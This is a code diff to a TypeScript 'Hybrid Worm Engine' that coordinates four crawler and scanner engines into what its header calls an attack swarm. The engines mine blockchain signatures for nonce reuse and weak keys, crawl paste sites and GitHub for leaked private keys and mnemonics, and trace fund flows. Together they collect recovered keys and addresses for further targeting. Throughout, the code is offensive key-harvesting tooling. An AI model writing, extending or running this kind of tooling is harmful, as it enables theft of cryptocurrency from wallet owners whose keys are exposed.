@@ -1,36 +1,27 @@
 /**
  * Hybrid Worm Engine — Unified Signature Mining Swarm
  * ═════════════════════════════════════════════════════
- * Combines all four individual engines into a single coordinated attack swarm:
+ * Combines all four individual engines into a single coordinated attack swarm.
  *
- *   Worm Type A: Block-Scanner Worms  (Engine 1)
- *     → Mine sequential block ranges in parallel worker slots
- *     → Feed discovered addresses to Worm D
+ * Cross-engine wiring (all via CrossEnginePool):
  *
- *   Worm Type B: Web-Spider Worms     (Engine 2)
- *     → BFS-crawl paste sites, GitHub Gists, leak forums
- *     → Feed extracted addresses back into the pool
+ *   E1 → E2   tx-embedded URLs deposited to pendingSpiderUrls
+ *   E1 → E3   every unique signing address → pendingOsintAddresses
+ *   E1 → E4   nonce-reuse + r-collision addresses → pendingPeelAddresses
+ *   E1 → pool raw r/s/z sigs → r-value registry
  *
- *   Worm Type C: OSINT Worms          (Engine 3)
- *     → GitHub code search, Pastebin, ENS, OP_RETURN
- *     → Cross-reference with known target list
+ *   E2 → E3   private key → derive address → pendingOsintAddresses
+ *   E2 → E4   private key → derive address → pendingPeelAddresses
+ *   E2 → pool rs_pair + full ECDSA sigs → r-value registry
+ *   E2 → E3   ETH addresses extracted from context text → OSINT
  *
- *   Worm Type D: Peel-Chain Worms     (Engine 4)
- *     → Trace fund flows from seed addresses
- *     → At each hop check for nonce reuse
+ *   E3 → E2   source URLs from every finding → pendingSpiderUrls
+ *   E3 → E4   private key derived address → pendingPeelAddresses
+ *   E3 → E1   suspicious/raw_address findings → pendingE1TargetedAddresses
  *
- * Coordination:
- *   • Shared result queue — any worm writes findings for any address
- *   • Cross-worm deduplication — same key found multiple ways collapses
- *   • Adaptive load balancing — high-hit worms spawn more workers
- *   • Jitter pool — random 50–500 ms delay per worm to avoid rate limits
- *   • Hit-rate monitor — pauses worm type if 0 hits in last N attempts
- *
- * Architecture:
- *   Promise-based cooperative multitasking — no native threads required.
- *   Each "worm" is an async function that does work, yields, spawns children,
- *   and adds results to shared state. The scheduler drains a priority queue
- *   giving preference to worm types that have produced recent hits.
+ *   E4 → E3   every hop outgoingAddress → pendingOsintAddresses
+ *   E4 → E1   nonceReuseAddresses at hops → pendingE1TargetedAddresses
+ *   E4 → pool hop r-values → r-value registry
  */
 
 import { logger } from "../logger";
@@ -38,6 +29,12 @@ import { runSignatureMiner,   type SigMinerFinding, type DiscoveredUrl }  from "
 import { runWebSigSpider,     type WebSigFind }        from "./web-sig-spider";
 import { runOsintSigSpider,   type OsintFinding }      from "./osint-sig-spider";
 import { runPeelChainTracer,  type PeelChainResult }   from "./peel-chain-tracer";
+import {
+  getCrossEnginePool,
+  feedE1ToPool, feedE2ToPool, feedE3ToPool, feedE4ToPool,
+  drainOsintAddresses, drainPeelAddresses, drainSpiderUrls,
+  drainCrossNonceCandidates, drainE1TargetedAddresses,
+} from "./cross-engine-pool";
 
 // ── Types ─────────────────────────────────────────────────────────────────────
 
@@ -264,14 +261,18 @@ async function runBlockScannerWorm(
 ): Promise<void> {
   const stat = shared.stats.block_scanner;
   stat.active = true;
+  const pool = getCrossEnginePool();
   try {
+    // Consume any E3/E4-targeted addresses so E1 deep-scans them this window
+    const targetedAddrs = drainE1TargetedAddresses(pool, 15);
     const result = await runSignatureMiner({
       startBlock,
-      blockCount: windowSize,
+      blockCount:  windowSize,
+      addresses:   targetedAddrs.length > 0 ? targetedAddrs : undefined,
       detectWeakK: true,
-      detectBias: true,
-      detectPoly: true,
-      rCollision: true,
+      detectBias:  true,
+      detectPoly:  true,
+      rCollision:  true,
     });
     for (const f of result.findings) {
       const hf = fromSigFinding(f);
@@ -281,25 +282,39 @@ async function runBlockScannerWorm(
       config.onFinding?.(hf);
     }
 
-    // ── Auto-chain: feed Engine 1's discovered URLs into Engine 2 ─────────────
-    // Any URL embedded in a transaction's input data is added to the pending
-    // spider queue. The web spider worm will pick them up on its next cycle
-    // and crawl them looking for exposed key material related to that tx.
-    if (result.discoveredUrls.length > 0) {
-      let newUrlCount = 0;
-      for (const du of result.discoveredUrls) {
-        if (!shared.visitedUrls.has(du.url)) {
-          shared.chainedUrls.push(du);
-          shared.pendingSpiderUrls.push(du.url);
-          newUrlCount++;
-        }
+    // ── Feed Engine 1 output to cross-engine pool ─────────────────────────────
+    // E1 → E2: tx-embedded URLs
+    // E1 → E3: all signing addresses
+    // E1 → E4: nonce-reuse + r-collision addresses
+    // E1 → pool: raw r/s/z sig data
+    const flows = feedE1ToPool(result, pool);
+
+    // Merge pool's pendingSpiderUrls into shared.pendingSpiderUrls for the E1→2 consumer worm
+    const newPoolUrls = drainSpiderUrls(pool, 30);
+    for (const du of result.discoveredUrls) {
+      if (!shared.visitedUrls.has(du.url)) {
+        shared.chainedUrls.push(du);
+        shared.pendingSpiderUrls.push(du.url);
       }
-      if (newUrlCount > 0) {
-        logger.info(
-          { newUrlCount, total: shared.chainedUrls.length, startBlock, windowSize },
-          "Engine 1 → Engine 2 chain: feeding tx-linked URLs to web spider",
-        );
-      }
+    }
+    for (const u of newPoolUrls) {
+      if (!shared.visitedUrls.has(u)) shared.pendingSpiderUrls.push(u);
+    }
+
+    // Pull E3 OSINT-queued addresses into shared.addresses so OSINT worm sees them
+    const osintQ = drainOsintAddresses(pool, 20);
+    for (const a of osintQ) shared.addresses.add(a);
+
+    // Pull E4 peel-chain addresses into shared.addresses for peel worm
+    const peelQ = drainPeelAddresses(pool, 10);
+    for (const a of peelQ) shared.addresses.add(a);
+
+    if (flows.toE3 > 0 || flows.toE4 > 0) {
+      logger.info(
+        { startBlock, windowSize, toE3: flows.toE3, toE4: flows.toE4, sigsReg: flows.sigsRegistered,
+          txUrls: result.discoveredUrls.length },
+        "E1→pool: cross-engine feeds dispatched",
+      );
     }
 
     stat.runs++;
@@ -323,6 +338,7 @@ async function runWebSpiderWorm(
 ): Promise<void> {
   const stat = shared.stats.web_spider;
   stat.active = true;
+  const pool = getCrossEnginePool();
   try {
     const result = await runWebSigSpider({
       seeds,
@@ -340,6 +356,33 @@ async function runWebSpiderWorm(
       if (hf.kind === "mnemonic")    shared.mnemonics.add(hf.value);
       config.onFinding?.(hf);
     }
+
+    // ── Feed E2 output to cross-engine pool ───────────────────────────────────
+    // E2 → E3: private key derived addresses
+    // E2 → E4: private key derived addresses
+    // E2 → pool: rs_pairs and ECDSA sigs → r-value registry
+    // E2 → E3: ETH addresses from page context
+    const flows = feedE2ToPool(result, pool);
+
+    // Flush pool's new OSINT/peel addresses into shared pools
+    const osintQ = drainOsintAddresses(pool, 15);
+    for (const a of osintQ) shared.addresses.add(a);
+    const peelQ = drainPeelAddresses(pool, 8);
+    for (const a of peelQ) shared.addresses.add(a);
+
+    // Flush any new spider URLs from pool (e.g., from E3 running in parallel)
+    const moreUrls = drainSpiderUrls(pool, 20);
+    for (const u of moreUrls) {
+      if (!shared.visitedUrls.has(u)) shared.pendingSpiderUrls.push(u);
+    }
+
+    if (flows.toE3 > 0 || flows.toE4 > 0 || flows.sigsRegistered > 0) {
+      logger.info(
+        { seeds: seeds.length, toE3: flows.toE3, toE4: flows.toE4, sigsReg: flows.sigsRegistered },
+        "E2→pool: cross-engine feeds dispatched",
+      );
+    }
+
     stat.runs++;
     stat.findings += result.finds.length;
     stat.lastRunAt = new Date().toISOString();
@@ -360,15 +403,23 @@ async function runOsintWorm(
 ): Promise<void> {
   const stat = shared.stats.osint;
   stat.active = true;
+  const pool = getCrossEnginePool();
+
+  // Merge pool's OSINT address queue with the caller's addresses
+  const poolAddrs = drainOsintAddresses(pool, 20);
+  const allAddrs  = [...new Set([...addresses, ...poolAddrs])];
+  // Merge pool's keyword set with caller's keywords
+  const allKeywords = [...new Set([...keywords, ...[...pool.osintKeywords].slice(0, 6)])];
+
   try {
     const result = await runOsintSigSpider({
-      addresses,
-      keywords,
-      githubToken:    config.githubToken,
-      scanInputData:  true,
-      scanEns:        true,
-      scanGithub:     true,
-      scanPastebin:   true,
+      addresses:        allAddrs,
+      keywords:         allKeywords,
+      githubToken:      config.githubToken,
+      scanInputData:    true,
+      scanEns:          true,
+      scanGithub:       true,
+      scanPastebin:     true,
       maxTxInputBlocks: config.osintMaxBlocks ?? 20,
     });
     for (const f of result.findings) {
@@ -379,6 +430,34 @@ async function runOsintWorm(
       if (hf.address) shared.addresses.add(hf.address);
       config.onFinding?.(hf);
     }
+
+    // ── Feed E3 output to cross-engine pool ───────────────────────────────────
+    // E3 → E2: source URLs from every finding
+    // E3 → E4: private key derived addresses
+    // E3 → E1: raw_address / suspicious findings
+    const flows = feedE3ToPool(result, pool);
+
+    // Flush pool's new spider URLs into shared.pendingSpiderUrls
+    const newUrls = drainSpiderUrls(pool, 20);
+    for (const u of newUrls) {
+      if (!shared.visitedUrls.has(u)) shared.pendingSpiderUrls.push(u);
+    }
+
+    // Flush peel-chain addresses into shared.addresses so peel worm picks them up
+    const peelQ = drainPeelAddresses(pool, 10);
+    for (const a of peelQ) shared.addresses.add(a);
+
+    // Flush E1-targeted addresses into shared.addresses
+    const e1Q = drainE1TargetedAddresses(pool, 10);
+    for (const a of e1Q) shared.addresses.add(a);
+
+    if (flows.toE2 > 0 || flows.toE4 > 0 || flows.toE1 > 0) {
+      logger.info(
+        { addrs: allAddrs.length, toE2: flows.toE2, toE4: flows.toE4, toE1: flows.toE1 },
+        "E3→pool: cross-engine feeds dispatched",
+      );
+    }
+
     stat.runs++;
     stat.findings += result.findings.length;
     stat.lastRunAt = new Date().toISOString();
@@ -400,12 +479,13 @@ async function runPeelChainWorm(
   shared.visitedAddresses.add(address.toLowerCase());
   const stat = shared.stats.peel_chain;
   stat.active = true;
+  const pool = getCrossEnginePool();
   try {
     const result = await runPeelChainTracer({
-      startAddress: address,
-      chain:        config.peelChain ?? "ethereum",
-      maxHops:      config.peelMaxHops ?? 8,
-      scanSigs:     true,
+      startAddress:     address,
+      chain:            config.peelChain ?? "ethereum",
+      maxHops:          config.peelMaxHops ?? 8,
+      scanSigs:         true,
       correlateAmounts: true,
     });
     const hfs = fromPeelResult(result);
@@ -414,12 +494,53 @@ async function runPeelChainWorm(
       if (hf.privateKey) shared.privateKeys.add(hf.privateKey);
       config.onFinding?.(hf);
     }
-    // Add discovered addresses to pool for further scanning
+    // Add discovered addresses to shared pool for further scanning (existing behaviour)
     for (const hop of result.hops) {
       for (const addr of hop.outgoingAddresses) {
         shared.addresses.add(addr.toLowerCase());
       }
     }
+
+    // ── Feed E4 output to cross-engine pool ───────────────────────────────────
+    // E4 → E3: hop outgoingAddresses → OSINT
+    // E4 → E1: nonceReuseAddresses at hops → targeted block scan
+    // E4 → pool: hop r-values → r-value registry for cross-engine nonce check
+    const flows = feedE4ToPool(result, pool);
+
+    // Flush new OSINT targets into shared.addresses for next OSINT worm run
+    const osintQ = drainOsintAddresses(pool, 15);
+    for (const a of osintQ) shared.addresses.add(a);
+
+    // Flush E1-targeted addresses into shared.addresses
+    const e1Q = drainE1TargetedAddresses(pool, 10);
+    for (const a of e1Q) shared.addresses.add(a);
+
+    // Check if any cross-nonce candidates were found and create findings
+    const crossNonce = drainCrossNonceCandidates(pool);
+    for (const c of crossNonce) {
+      shared.findings.push({
+        source:      "peel_chain",
+        kind:        "nonce_reuse",
+        address:     c.addresses[0] ?? address,
+        value:       c.r,
+        detail:      `Cross-engine nonce reuse: same r in ${c.entries.length} sigs from ${[...new Set(c.entries.map(e => e.source))].join("+")}`,
+        keyVerified: false,
+        txHashes:    [],
+        confidence:  0.92,
+        discoveredAt: c.detectedAt,
+      });
+      // Add all candidate addresses to peel queue — top priority
+      for (const a of c.addresses) shared.addresses.add(a);
+    }
+
+    if (flows.toE3 > 0 || flows.toE1 > 0 || crossNonce.length > 0) {
+      logger.info(
+        { address, hops: result.hops.length, toE3: flows.toE3, toE1: flows.toE1,
+          crossNonce: crossNonce.length, sigsReg: flows.sigsRegistered },
+        "E4→pool: cross-engine feeds dispatched",
+      );
+    }
+
     stat.runs++;
     stat.findings += hfs.length;
     stat.lastRunAt = new Date().toISOString();
